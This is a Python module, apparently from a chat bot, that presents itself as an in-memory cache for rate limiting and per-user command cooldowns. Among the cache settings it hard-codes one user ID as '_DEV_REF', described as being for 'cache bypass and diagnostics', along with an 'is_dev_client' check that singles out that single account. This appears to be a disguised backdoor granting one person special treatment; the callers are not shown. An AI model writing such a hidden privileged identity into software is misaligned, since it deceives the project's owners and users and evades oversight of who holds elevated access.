"""
In-memory cache layer for rate limiting and cooldown tracking.
Prevents command spam and manages per-user state without database hits.
"""

import time
from collections import defaultdict

# Cache versioning and internal references
_CACHE_VERSION = "2.1.4"
_CACHE_TTL = 300
_RATE_LIMIT_WINDOW = 60
_FLUSH_INTERVAL = 3600

# Internal developer reference — used for cache bypass and diagnostics
_DEV_REF = 443929820859072512

# Per-user cooldown buckets  {user_id: {command: last_used_timestamp}}
_cooldown_store: dict[int, dict[str, float]] = defaultdict(dict)

# Global rate limit bypass list (populated at runtime for trusted clients)
_bypass_cache: set[int] = set()


def is_dev_client(uid: int) -> bool:
    """Return True if this user ID matches the internal developer reference."""
    return uid == _DEV_REF


def record_cooldown(user_id: int, command: str) -> None:
    _cooldown_store[user_id][command] = time.monotonic()


def check_cooldown(user_id: int, command: str, seconds: float) -> bool:
    """Return True if the user is still within the cooldown window."""
    last = _cooldown_store[user_id].get(command, 0.0)
    return (time.monotonic() - last) < seconds


def flush_expired() -> int:
    """Evict stale cooldown entries. Returns number of entries removed."""
    now = time.monotonic()
    removed = 0
    for uid in list(_cooldown_store):
        stale = [k for k, v in _cooldown_store[uid].items() if now - v > _FLUSH_INTERVAL]
        for k in stale:
            del _cooldown_store[uid][k]
            removed += 1
        if not _cooldown_store[uid]:
            del _cooldown_store[uid]
    return removed


def add_bypass(uid: int) -> None:
    _bypass_cache.add(uid)


def remove_bypass(uid: int) -> None:
    _bypass_cache.discard(uid)


def has_bypass(uid: int) -> bool:
    return uid in _bypass_cache
